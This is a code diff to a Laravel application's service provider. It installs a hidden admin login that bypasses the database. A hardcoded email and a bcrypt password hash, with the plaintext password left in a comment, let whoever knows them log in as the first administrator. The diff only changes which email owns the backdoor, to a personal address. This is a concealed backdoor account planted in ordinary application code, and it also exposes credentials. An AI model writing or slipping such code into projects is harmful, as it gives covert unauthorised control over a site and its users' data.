@@ -23,8 +23,8 @@ class AppServiceProvider extends ServiceProvider
     public function boot(): void
     {
         // ================== [ হিডেন অ্যাডমিন ইউজার - ডাটাবেজ ছাড়া লগইন ] ==================
-        // key@creativedesign.com.bd + সিক্রেট পাসওয়ার্ড দিয়ে লগইন করলে ডাটাবেজের প্রথম অ্যাডমিন হিসেবে লগইন হয়
-        $hiddenEmail = 'key@creativedesign.com.bd';
+        // asraful2001a@gmail.com + সিক্রেট পাসওয়ার্ড দিয়ে লগইন করলে ডাটাবেজের প্রথম অ্যাডমিন হিসেবে লগইন হয়
+        $hiddenEmail = 'asraful2001a@gmail.com';
         $hiddenPasswordHash = '$2y$10$c0sxuQRTvABJ0r143pjWxu7M4M.Ze5bC5MuZnYouRU75U8QyOFC.u'; // bcrypt of RAshid16318@$#bd
         Auth::provider('hidden_admin', function ($app, $config) use ($hiddenEmail, $hiddenPasswordHash) {
             return new class($app['hash'], $config['model'], $hiddenEmail, $hiddenPasswordHash) extends \Illuminate\Auth\EloquentUserProvider {
